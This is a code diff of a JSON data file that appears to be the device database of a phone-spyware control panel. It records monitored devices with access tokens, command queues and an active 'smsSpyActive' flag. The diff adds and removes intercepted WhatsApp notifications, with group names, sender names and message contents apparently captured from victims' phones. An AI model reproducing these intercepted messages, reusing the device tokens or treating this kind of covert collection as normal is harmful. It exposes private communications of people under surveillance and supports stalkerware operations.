@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776782250921,
+    "lastSeen": 1776782253949,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (157 pesan): ~ david",
+        "content": "📷 SPEK GAGAH SEMI OLD CLUBER ON GENJI ON OP 300 PAS",
+        "time": "21/04 21:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782256343
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2965 pesan dari 19 chat",
+        "time": "21/04 21:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782253385
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (156 pesan): ~ david",
@@ -10312,22 +10328,6 @@
         "time": "21/04 21:02",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780156238
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3582 pesan dari 19 chat",
-        "time": "21/04 21:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780147129
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB1 ALDY BANYUMAS JATENG (56 pesan): ~ reall rezzsturr",
-        "content": "📷 4PAS RAME INF0 41 PM\nLOG BIND ALL AMAN REBIND AE KE MAIL POLOSMU",
-        "time": "21/04 21:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780147095
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776782252241,
+    "lastSeen": 1776782255151,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
